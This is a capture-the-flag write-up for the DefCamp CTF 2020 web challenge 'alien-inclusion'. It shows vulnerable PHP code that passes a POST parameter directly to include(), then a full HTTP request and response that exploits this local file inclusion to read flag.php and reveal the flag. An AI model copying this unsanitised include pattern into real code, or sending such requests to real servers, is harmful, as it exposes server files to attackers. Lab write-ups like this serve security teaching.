# DefCamp CTF 2020 – alien-inclusion

* **Category:** web
* **Points:** 50

## Challenge

> Keep it local and you should be fine. The flag is in /var/www/html/flag.php.
> 
> Flag format: CTF{sha256}
> 
> The challenge was proposed by BIT SENTINEL.
> 
> 35.234.65.24:30627

## Solution

The challenge will print a PHP source code.

```php
<?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

include ($_POST['start']);
echo $secret;
```

You can craft a request like the following.

```
POST /?start=/var/www/html/flag.php HTTP/1.1
Host: 35.234.65.24:30627
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 28
Content-Type: application/x-www-form-urlencoded

start=/var/www/html/flag.php

HTTP/1.1 200 OK
Date: Sat, 05 Dec 2020 12:55:40 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 69
Connection: close
Content-Type: text/html; charset=UTF-8

ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}
```